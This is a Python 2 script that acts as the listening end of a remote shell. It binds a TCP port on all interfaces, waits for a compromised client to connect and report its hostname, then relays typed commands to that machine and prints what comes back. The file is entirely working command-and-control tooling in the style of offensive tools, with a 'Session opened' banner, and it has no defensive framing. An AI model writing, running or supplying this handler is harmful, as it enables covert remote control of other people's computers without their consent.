#!/usr/bin/env python

import socket, os, sys

def socketCreate():
    try:
        global host
        global port
        global s
        port = int(os.getenv('REMOTE_PORT', "8888"))
        print 'Creating socket'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print 'Socket creation error :' + str(msg)

def socketBind():
    # it will try up to 10 times
    for x in range(0, 10):
        try:
            print 'Binding socket at port %s' % (port)
            # s.bind will bind socket tp the designated port
            s.bind(("0.0.0.0",port))
            # s.liston will stand for maximum number of connections
            s.listen(1)
            break;
        except socket.error as msg:
            print 'Socket binding error: ' + str(msg)
            # In case of exceptions, it'll retry until binding is successful
            if x == 9:
                print 'Exitting'
                s.close()
                sys.exit()
            else:
                continue

def socketAccept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print '[!] Session opened at %s:%s' % (addr[0], addr[1])
        print '\n'

        # will assign variable hostname to the hostname of the remote client
        hostname = conn.recv(1024)
        menu()
    except socket.error as msg:
        print 'Socket Accepting error: ' + str(msg)

def menu():
    while True:
        cmd = raw_input(str(addr[0]) + '@' + str(hostname) + '> ')
        command = conn.send(cmd)
        result = conn.recv(16834)
        if result != hostname:
            print result
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

def main():
    socketCreate()
    socketBind()
    socketAccept()


main()
